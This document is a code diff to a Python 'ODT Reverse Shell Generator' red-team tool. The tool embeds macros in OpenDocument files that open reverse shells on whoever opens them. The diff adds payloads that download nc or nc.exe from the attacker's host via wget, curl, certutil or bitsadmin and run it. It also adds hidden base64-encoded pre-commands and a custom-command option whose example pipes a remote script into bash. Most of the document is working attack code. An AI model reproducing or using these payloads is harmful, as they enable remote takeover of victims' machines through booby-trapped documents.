@@ -42,8 +42,28 @@ def _windows_cmd(cmd):
     return _macro("cmd.exe", f"/c {cmd}")
 
 
-def _windows_via_ps(lang_cmd):
-    return _windows_ps(f"& {lang_cmd}")
+def _pre_cmd_shell_line(cmd, target_os):
+    """Build a synchronous Shell line to prepend before the main payload."""
+    if target_os == "linux":
+        if "'" not in cmd:
+            params = f"-c '{cmd}'"
+        else:
+            enc = base64.b64encode(cmd.encode()).decode()
+            params = f"-c 'echo {enc}|base64 -d|bash'"
+        esc = params.replace('"', '""')
+        return f'    Shell "/bin/bash", 0, "{esc}", True'
+    else:
+        enc = base64.b64encode(cmd.encode("utf-16-le")).decode()
+        return f'    Shell "powershell.exe", 0, "-nop -w hidden -e {enc}", True'
+
+
+def inject_pre_cmds(macro, pre_cmds, target_os):
+    """Inject synchronous pre-commands before the main payload in the macro."""
+    lines = []
+    for cmd in pre_cmds:
+        lines.append(_pre_cmd_shell_line(cmd, target_os))
+    insert = "\n".join(lines)
+    return macro.replace("Sub Main\n", f"Sub Main\n{insert}\n", 1)
 
 
 # ---------------------------------------------------------------------------
@@ -58,36 +78,52 @@ def _build_linux_payloads():
 
     # -- Bash --
     add("bash-tcp", "Bash /dev/tcp reverse shell", "bash",
-        lambda ip, p: _linux(f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"))
+        lambda ip, p, hp=80: _linux(f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"))
 
     add("bash-udp", "Bash /dev/udp reverse shell", "bash",
-        lambda ip, p: _linux(f"bash -i >& /dev/udp/{ip}/{p} 0>&1"))
+        lambda ip, p, hp=80: _linux(f"bash -i >& /dev/udp/{ip}/{p} 0>&1"))
 
     # -- Netcat variants --
     add("nc-e", "Netcat -e reverse shell", "nc (traditional)",
-        lambda ip, p: _linux(f"nc -e /bin/bash {ip} {p}"))
+        lambda ip, p, hp=80: _linux(f"nc -e /bin/bash {ip} {p}"))
 
     add("nc-c", "Netcat -c reverse shell", "nc (OpenBSD with -c)",
-        lambda ip, p: _linux(f"nc -c bash {ip} {p}"))
+        lambda ip, p, hp=80: _linux(f"nc -c bash {ip} {p}"))
 
     add("nc-mkfifo", "Netcat mkfifo (no -e/-c)", "nc, mkfifo",
-        lambda ip, p: _linux(
+        lambda ip, p, hp=80: _linux(
             f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {p} >/tmp/f"))
 
     add("nc-mknod", "Netcat mknod pipe method", "nc, mknod",
-        lambda ip, p: _linux(
+        lambda ip, p, hp=80: _linux(
             f"mknod /tmp/bp p && nc {ip} {p} 0</tmp/bp | /bin/bash 1>/tmp/bp"))
+
+    # -- Netcat download & execute --
+    add("nc-download-wget", "Download nc via wget, then execute", "wget",
+        lambda ip, p, hp=80: _linux(
+            f"wget -q http://{ip}:{hp}/nc -O /tmp/nc && chmod +x /tmp/nc "
+            f"&& /tmp/nc -e /bin/bash {ip} {p}"))
+
+    add("nc-download-curl", "Download nc via curl, then execute", "curl",
+        lambda ip, p, hp=80: _linux(
+            f"curl -so /tmp/nc http://{ip}:{hp}/nc && chmod +x /tmp/nc "
+            f"&& /tmp/nc -e /bin/bash {ip} {p}"))
+
+    add("nc-download-fetch", "Download nc via fetch, then execute", "fetch (FreeBSD)",
+        lambda ip, p, hp=80: _linux(
+            f"fetch -qo /tmp/nc http://{ip}:{hp}/nc && chmod +x /tmp/nc "
+            f"&& /tmp/nc -e /bin/bash {ip} {p}"))
 
     # -- Ncat --
     add("ncat", "Ncat (Nmap) reverse shell", "ncat",
-        lambda ip, p: _linux(f"ncat {ip} {p} -e /bin/bash"))
+        lambda ip, p, hp=80: _linux(f"ncat {ip} {p} -e /bin/bash"))
 
     add("ncat-ssl", "Ncat with SSL encryption", "ncat",
-        lambda ip, p: _linux(f"ncat --ssl {ip} {p} -e /bin/bash"))
+        lambda ip, p, hp=80: _linux(f"ncat --ssl {ip} {p} -e /bin/bash"))
 
     # -- Socat --
     add("socat", "Socat interactive PTY shell", "socat",
-        lambda ip, p: _linux(
+        lambda ip, p, hp=80: _linux(
             f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{p}"))
 
     # -- Python --
@@ -100,13 +136,13 @@ def _build_linux_payloads():
         return _linux(cmd)
 
     add("python", "Python 2 reverse shell", "python",
-        lambda ip, p: _py(ip, p, "python"))
+        lambda ip, p, hp=80: _py(ip, p, "python"))
 
     add("python3", "Python 3 reverse shell", "python3",
-        lambda ip, p: _py(ip, p, "python3"))
+        lambda ip, p, hp=80: _py(ip, p, "python3"))
 
     # -- Perl --
-    def _perl_linux(ip, p):
+    def _perl_linux(ip, p, hp=80):
         cmd = (f"""perl -e 'use Socket;$i="{ip}";$p={p};"""
                f"""socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
                f"""if(connect(S,sockaddr_in($p,inet_aton($i))))"""
@@ -117,7 +153,7 @@ def _build_linux_payloads():
     add("perl", "Perl reverse shell", "perl", _perl_linux)
 
     # -- PHP --
-    def _php_linux(ip, p):
+    def _php_linux(ip, p, hp=80):
         cmd = (f"""php -r '$sock=fsockopen("{ip}",{p});"""
                f"""$proc=proc_open("/bin/bash -i","""
                f"""array(0=>$sock,1=>$sock,2=>$sock),$pipes);'""")
@@ -126,7 +162,7 @@ def _build_linux_payloads():
     add("php", "PHP reverse shell (proc_open)", "php", _php_linux)
 
     # -- Ruby --
-    def _ruby_linux(ip, p):
+    def _ruby_linux(ip, p, hp=80):
         cmd = (f"""ruby -rsocket -e 'f=TCPSocket.open("{ip}",{p}).to_i;"""
                f"""exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'""")
         return _linux(cmd)
@@ -134,7 +170,7 @@ def _build_linux_payloads():
     add("ruby", "Ruby reverse shell", "ruby", _ruby_linux)
 
     # -- Node.js --
-    def _node_linux(ip, p):
+    def _node_linux(ip, p, hp=80):
         cmd = (f"""node -e 'var net=require("net"),"""
                f"""sh=require("child_process").exec("/bin/bash");"""
                f"""var c=new net.Socket();"""
@@ -146,27 +182,27 @@ def _build_linux_payloads():
 
     # -- Telnet --
     add("telnet", "Telnet mkfifo reverse shell", "telnet, mkfifo",
-        lambda ip, p: _linux(
+        lambda ip, p, hp=80: _linux(
             f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {p} 0<$TF | /bin/bash 1>$TF"))
 
     # -- OpenSSL --
     add("openssl", "OpenSSL encrypted reverse shell", "openssl, mkfifo",
-        lambda ip, p: _linux(
+        lambda ip, p, hp=80: _linux(
             f"mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1"
             f"|openssl s_client -quiet -connect {ip}:{p} > /tmp/s;rm /tmp/s"))
 
     # -- AWK --
-    def _awk_linux(ip, p):
+    def _awk_linux(ip, p, hp=80):
         cmd = (f"""awk 'BEGIN{{s="/inet/tcp/0/{ip}/{p}";"""
                f"""while(42){{do{{printf "$ "|&s;s|&getline c;"""
                f"""if(c){{while((c|&getline)>0)print $0|&s;close(c)}}"""
                f"""}}while(c!="exit")close(s)}}}}'""")
         return _linux(cmd)
 
-    add("awk", "AWK /inet reverse shell", "gawk",  _awk_linux)
+    add("awk", "AWK /inet reverse shell", "gawk", _awk_linux)
 
     # -- Lua --
-    def _lua_linux(ip, p):
+    def _lua_linux(ip, p, hp=80):
         cmd = (f"""lua -e 'local s=require("socket");"""
                f"""local t=assert(s.tcp());t:connect("{ip}",{p});"""
                f"""while true do local r,x=t:receive();"""
@@ -187,7 +223,7 @@ def _build_windows_payloads():
         P[name] = {"desc": desc, "requires": requires, "build": fn}
 
     # -- PowerShell (standard) --
-    def _ps_standard(ip, p):
+    def _ps_standard(ip, p, hp=80):
         ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
               "$s=$c.GetStream();"
               "[byte[]]$b=0..65535|%{0};"
@@ -204,7 +240,7 @@ def _build_windows_payloads():
     add("powershell", "PowerShell TCPClient (base64)", "powershell", _ps_standard)
 
     # -- PowerShell with error handling --
-    def _ps_trycatch(ip, p):
+    def _ps_trycatch(ip, p, hp=80):
         ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
               "$s=$c.GetStream();"
               "[byte[]]$b=0..65535|%{0};"
@@ -222,7 +258,7 @@ def _build_windows_payloads():
         _ps_trycatch)
 
     # -- PowerShell TLS --
-    def _ps_tls(ip, p):
+    def _ps_tls(ip, p, hp=80):
         ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
               "$s=$c.GetStream();"
               "$ssl=New-Object System.Net.Security.SslStream($s,$false,({$true}));"
@@ -242,10 +278,38 @@ def _build_windows_payloads():
 
     # -- nc.exe --
     add("nc", "nc.exe -e cmd.exe", "nc.exe on target",
-        lambda ip, p: _windows_cmd(f"nc.exe -e cmd.exe {ip} {p}"))
+        lambda ip, p, hp=80: _windows_cmd(f"nc.exe -e cmd.exe {ip} {p}"))
+
+    # -- nc.exe download & execute --
+    def _nc_dl_certutil(ip, p, hp=80):
+        ps = (f"certutil -urlcache -f http://{ip}:{hp}/nc.exe "
+              f"C:\\Windows\\Temp\\nc.exe; "
+              f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {ip} {p}")
+        return _windows_ps(ps)
+
+    add("nc-download-certutil", "Download nc.exe via certutil, then execute",
+        "certutil", _nc_dl_certutil)
+
+    def _nc_dl_ps(ip, p, hp=80):
+        ps = (f"Invoke-WebRequest -Uri http://{ip}:{hp}/nc.exe "
+              f"-OutFile C:\\Windows\\Temp\\nc.exe; "
+              f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {ip} {p}")
+        return _windows_ps(ps)
+
+    add("nc-download-ps", "Download nc.exe via PowerShell, then execute",
+        "powershell", _nc_dl_ps)
+
+    def _nc_dl_bitsadmin(ip, p, hp=80):
+        ps = (f"bitsadmin /transfer nc /download /priority high "
+              f"http://{ip}:{hp}/nc.exe C:\\Windows\\Temp\\nc.exe; "
+              f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {ip} {p}")
+        return _windows_ps(ps)
+
+    add("nc-download-bitsadmin", "Download nc.exe via bitsadmin, then execute",
+        "bitsadmin", _nc_dl_bitsadmin)
 
     # -- Python (Windows) --
-    def _py_win(ip, p):
+    def _py_win(ip, p, hp=80):
         ps = (f"""& python -c 'import socket,subprocess,os;"""
               f"""s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
               f"""s.connect(("{ip}",{p}));"""
@@ -257,7 +321,7 @@ def _build_windows_payloads():
         _py_win)
 
     # -- Perl (Windows) --
-    def _perl_win(ip, p):
+    def _perl_win(ip, p, hp=80):
         ps = (f"""& perl -e 'use Socket;$i="{ip}";$p={p};"""
               f"""socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
               f"""if(connect(S,sockaddr_in($p,inet_aton($i))))"""
@@ -269,7 +333,7 @@ def _build_windows_payloads():
         _perl_win)
 
     # -- Ruby (Windows) --
-    def _ruby_win(ip, p):
+    def _ruby_win(ip, p, hp=80):
         ps = (f"""& ruby -rsocket -e "c=TCPSocket.new('{ip}',{p});"""
               f"""while(cmd=c.gets);IO.popen(cmd,'r'){{|io|c.print io.read}}end\"""")
         return _windows_ps(ps)
@@ -278,7 +342,7 @@ def _build_windows_payloads():
         _ruby_win)
 
     # -- Node.js (Windows) --
-    def _node_win(ip, p):
+    def _node_win(ip, p, hp=80):
         ps = (f"""& node -e "var net=require('net'),"""
               f"""sh=require('child_process').exec('cmd.exe');"""
               f"""var c=new net.Socket();"""
@@ -404,10 +468,7 @@ def build_module_xml(macro_code):
     )
 
 
-def generate_odt(ip, port, target_os, payload_name, output):
-    payload = PAYLOADS[target_os][payload_name]
-    macro = payload["build"](ip, port)
-
+def generate_odt(ip, port, target_os, output, macro, label):
     with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
         zf.writestr("mimetype", MIMETYPE, compress_type=zipfile.ZIP_STORED)
         zf.writestr("content.xml", CONTENT_XML)
@@ -418,8 +479,7 @@ def generate_odt(ip, port, target_os, payload_name, output):
         zf.writestr("Basic/script-lc.xml", SCRIPT_LC)
         zf.writestr("META-INF/manifest.xml", MANIFEST_XML)
 
-    print(f"[+] Payload:  {payload_name} — {payload['desc']}")
-    print(f"[+] Requires: {payload['requires']}")
+    print(f"[+] Payload:  {label}")
     print(f"[+] Target:   {target_os}")
     print(f"[+] Callback: {ip}:{port}")
     print(f"[+] Output:   {output}")
@@ -433,18 +493,14 @@ def generate_odt(ip, port, target_os, payload_name, output):
 def list_payloads(target_os):
     payloads = PAYLOADS[target_os]
     print(f"\n  Available {target_os} payloads ({len(payloads)}):\n")
-    print(f"  {'NAME':<22} {'REQUIRES':<24} DESCRIPTION")
-    print(f"  {'─' * 22} {'─' * 24} {'─' * 36}")
+    print(f"  {'NAME':<26} {'REQUIRES':<24} DESCRIPTION")
+    print(f"  {'─' * 26} {'─' * 24} {'─' * 40}")
     for name, info in payloads.items():
-        print(f"  {name:<22} {info['requires']:<24} {info['desc']}")
+        print(f"  {name:<26} {info['requires']:<24} {info['desc']}")
     print()
 
 
 def main():
-    all_names = sorted(set(
-        list(PAYLOADS["linux"].keys()) + list(PAYLOADS["windows"].keys())
-    ))
-
     parser = argparse.ArgumentParser(
         description="ODT Reverse Shell Generator — Red Team Tool",
         epilog=(
@@ -452,6 +508,11 @@ def main():
             "  %(prog)s 10.10.14.5 4444\n"
             "  %(prog)s 10.10.14.5 4444 --os windows --payload powershell-tls\n"
             "  %(prog)s 10.10.14.5 9001 --payload nc-mkfifo -o doc.odt\n"
+            "  %(prog)s 10.10.14.5 4444 -p nc-download-wget --http-port 8080\n"
+            "  %(prog)s 10.10.14.5 4444 --os windows -p nc-download-certutil --http-port 8000\n"
+            "  %(prog)s 10.10.14.5 4444 --cmd 'curl http://10.10.14.5/shell.sh|bash'\n"
+            "  %(prog)s 10.10.14.5 4444 --pre-cmd 'mkdir -p /tmp/.hidden'\n"
+            "  %(prog)s 10.10.14.5 4444 --pre-cmd 'whoami > /tmp/w' --pre-cmd 'id >> /tmp/w'\n"
             "  %(prog)s --list --os linux\n"
             "  %(prog)s --list --os windows\n"
             "\n"
@@ -459,6 +520,9 @@ def main():
             "  nc -lvnp 4444\n"
             "  ncat --ssl -lvnp 4444        (for ncat-ssl / powershell-tls)\n"
             "  openssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n"
+            "\n"
+            "host nc for download payloads:\n"
+            "  python3 -m http.server 8080   (serve nc/nc.exe from cwd)\n"
             "\n"
             "author: Abdulrahman Mustafa\n"
         ),
@@ -482,6 +546,18 @@ def main():
         "--list", "-l", action="store_true",
         help="List available payloads for the selected OS",
     )
+    parser.add_argument(
+        "--http-port", type=int, default=80,
+        help="Attacker HTTP port for download payloads (default: 80)",
+    )
+    parser.add_argument(
+        "--cmd", default=None, metavar="COMMAND",
+        help="Custom command to execute instead of a predefined payload",
+    )
+    parser.add_argument(
+        "--pre-cmd", action="append", default=[], metavar="COMMAND",
+        help="Command(s) to run before the main payload (can be repeated)",
+    )
 
     args = parser.parse_args()
 
@@ -495,17 +571,41 @@ def main():
     if not 1 <= args.port <= 65535:
         parser.error("port must be between 1 and 65535")
 
-    defaults = {"linux": "bash-tcp", "windows": "powershell"}
-    payload_name = args.payload or defaults[args.target_os]
+    if args.http_port and not 1 <= args.http_port <= 65535:
+        parser.error("--http-port must be between 1 and 65535")
 
-    if payload_name not in PAYLOADS[args.target_os]:
-        available = ", ".join(PAYLOADS[args.target_os].keys())
-        parser.error(
-            f"payload '{payload_name}' not available for {args.target_os}. "
-            f"Choose from: {available}"
-        )
+    # Build the macro
+    if args.cmd:
+        if args.target_os == "linux":
+            macro = _linux(args.cmd)
+        else:
+            macro = _windows_ps(args.cmd)
+        label = f"custom — {args.cmd[:60]}"
+    else:
+        defaults = {"linux": "bash-tcp", "windows": "powershell"}
+        payload_name = args.payload or defaults[args.target_os]
 
-    generate_odt(args.ip, args.port, args.target_os, payload_name, args.output)
+        if payload_name not in PAYLOADS[args.target_os]:
+            available = ", ".join(PAYLOADS[args.target_os].keys())
+            parser.error(
+                f"payload '{payload_name}' not available for {args.target_os}. "
+                f"Choose from: {available}"
+            )
+
+        payload = PAYLOADS[args.target_os][payload_name]
+        macro = payload["build"](args.ip, args.port, args.http_port)
+        label = f"{payload_name} — {payload['desc']}"
+
+        if payload_name.startswith("nc-download") and args.http_port != 80:
+            label += f" (http:{args.http_port})"
+
+    # Inject pre-commands
+    if args.pre_cmd:
+        macro = inject_pre_cmds(macro, args.pre_cmd, args.target_os)
+        for cmd in args.pre_cmd:
+            print(f"[+] Pre-cmd:  {cmd}")
+
+    generate_odt(args.ip, args.port, args.target_os, args.output, macro, label)
 
 
 if __name__ == "__main__":
